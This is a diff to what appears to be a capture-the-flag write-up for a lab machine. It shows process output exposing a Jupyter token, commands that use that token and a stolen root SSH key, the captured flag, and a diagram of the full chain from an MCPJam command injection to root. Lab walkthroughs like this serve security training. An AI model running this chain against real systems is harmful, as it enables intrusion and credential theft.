@@ -121,7 +121,9 @@ mcp-dev@devhub:/opt/mcpjam/node_modules$ ps aux | grep -i jupyter
 analyst     1062  0.0  2.4 181500 96240 ?        Ss   00:27   0:04 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
 root        1070  0.0  0.7  37376 28728 ?        Ss   00:27   0:07 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
 mcp-dev     2475  0.0  0.0   6828  2036 pts/0    S+   11:25   0:00 grep --color=auto -i jupyter
+```
 
+```
 Created a kernel — spawned a Python3 interpreter running as analyst
 
 curl -s http://127.0.0.1:8888/api/kernels \
@@ -174,6 +176,41 @@ ssh -i /tmp/root_key root@devhub.htb
 root@devhub:~# cat root.txt
 0abb1ee1f069a5d813a2aed001b55dc6
 ```
+
+
+```
+Port 6274 (MCPJam v1.4.2)
+        │
+        │  CVE-2026-23744
+        │  POST /api/mcp/connect
+        │  command injection via serverConfig
+        ▼
+ Shell as mcp-dev
+        │
+        │  ps aux leaks Jupyter token in plaintext
+        │  ss -tlnp reveals localhost ports 8888, 5000
+        ▼
+ Jupyter REST API (port 8888)
+        │
+        │  Token stolen from ps aux
+        │  Spawn kernel → WebSocket → execute Python
+        ▼
+ Code execution as analyst
+        │
+        │  Read /opt/opsmcp/server.py
+        │  Find hidden tool + hardcoded API key
+        ▼
+ Flask API (port 5000, running as root)
+        │
+        │  Call ops._admin_dump with target=ssh_keys
+        │  Root process reads /root/.ssh/id_rsa
+        ▼
+ Root SSH key dumped
+        │
+        ▼
+ SSH as root → root.txt 
+```
+
 
 
 
